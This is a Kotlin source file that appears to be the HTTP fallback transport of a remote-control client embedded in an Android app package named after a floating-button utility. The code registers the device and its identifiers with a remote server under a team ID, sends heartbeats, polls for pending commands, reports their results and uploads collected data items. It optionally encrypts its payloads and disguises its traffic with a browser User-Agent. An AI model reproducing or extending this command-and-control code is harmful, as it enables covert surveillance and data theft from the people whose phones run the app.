package io.github.chayanforyou.quickball.sync

import android.content.Context
import android.os.Build
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.GZIPInputStream

/**
 * HTTP fallback: register, heartbeat, command polling, sending results and data.
 * Only what's needed without WS; keep-alive is off — half-open sockets linger after sleep.
 */
class Http(
    private val ctx: Context,
    private val deviceId: String,
    private val teamId: String
) {

    private val base = "${if (Cfg.tls) "https" else "http"}://${Cfg.host}:${Cfg.port}${Cfg.path}"
    private val crypto = Crypto("$deviceId:$teamId")

    @Volatile
    var token: String = Cfg.token(ctx)

    @Volatile
    var lastForbidden: Boolean = false

    @Volatile
    private var lastCode: Int = 0

    fun register(): Boolean {
        val body = JSONObject()
            .put("device_id", deviceId)
            .put("team_id", teamId)
            .put("model", Build.MODEL)
            .put("android_version", Build.VERSION.RELEASE)
            .put("country", "")
            .put("battery_level", -1)
            .put("operator", "")
        Cfg.androidId(ctx).takeIf { it.isNotEmpty() }?.let { body.put("android_id", it) }

        val resp = post("/api/data/device/register", body)
        lastForbidden = lastCode == 403
        if (resp == null) return false
        resp.optString("device_token").takeIf { it.isNotEmpty() }?.let {
            token = it
            Cfg.setToken(ctx, it)
        }
        return true
    }

    fun heartbeat(battery: Int) {
        runCatching {
            post("/api/data/device/heartbeat", JSONObject()
                .put("device_id", deviceId)
                .put("battery_level", battery)
                .put("operator", ""))
        }
    }

    fun poll(): JSONArray = runCatching {
        val u = "$base/api/data/commands/pending?device_id=" + java.net.URLEncoder.encode(deviceId, "UTF-8")
        get(u)?.optJSONArray("commands") ?: JSONArray()
    }.getOrDefault(JSONArray())

    fun result(id: Long, status: String, result: String) {
        runCatching {
            post("/api/data/commands/result", JSONObject()
                .put("id", id)
                .put("status", status)
                .put("result", result))
        }
    }

    fun sendData(endpoint: String, items: JSONArray) {
        runCatching {
            post("/api/data/$endpoint", JSONObject()
                .put("device_id", deviceId)
                .put("team_id", teamId)
                .put("items", items))
        }
    }

    private fun post(path: String, body: JSONObject): JSONObject? = try {
        lastCode = 0
        val conn = open(path, "POST")
        conn.doOutput = true
        var payload = body.toString()
        if (Cfg.payloadCrypto) payload = JSONObject().put("e", crypto.encrypt(payload)).toString()
        conn.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
        read(conn)
    } catch (t: Throwable) {
        Log.e(TAG, "post $path: ${t.javaClass.simpleName}: ${t.message}")
        null
    }

    private fun get(fullUrl: String): JSONObject? = runCatching {
        read(open(fullUrl, "GET", absolute = true))
    }.getOrNull()

    private fun open(path: String, method: String, absolute: Boolean = false): HttpURLConnection {
        val conn = URL(if (absolute) path else base + path).openConnection() as HttpURLConnection
        conn.requestMethod = method
        conn.connectTimeout = Cfg.CONNECT_TIMEOUT
        conn.readTimeout = Cfg.READ_TIMEOUT
        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
        conn.setRequestProperty("Connection", "close")
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}) AppleWebKit/537.36")
        if (Cfg.payloadCrypto) {
            conn.setRequestProperty("X-Device-ID", deviceId)
            conn.setRequestProperty("X-Team-ID", teamId)
        }
        if (token.isNotEmpty()) conn.setRequestProperty("X-Device-Token", token)
        Log.d(TAG, "$method ${conn.url} dev=$deviceId")
        return conn
    }

    private fun read(conn: HttpURLConnection): JSONObject? {
        val code = conn.responseCode
        lastCode = code
        val stream = if (code < 400) conn.inputStream else conn.errorStream ?: return null
        val text = BufferedReader(
            InputStreamReader(
                if (conn.contentEncoding?.contains("gzip") == true) GZIPInputStream(stream) else stream,
                Charsets.UTF_8
            )
        ).use { it.readText() }
        conn.disconnect()
        Log.d(TAG, "code=$code len=${text.length}")
        if (code >= 400) return null
        return JSONObject(text)
    }

    private companion object {
        const val TAG = "QbHttp"
    }
}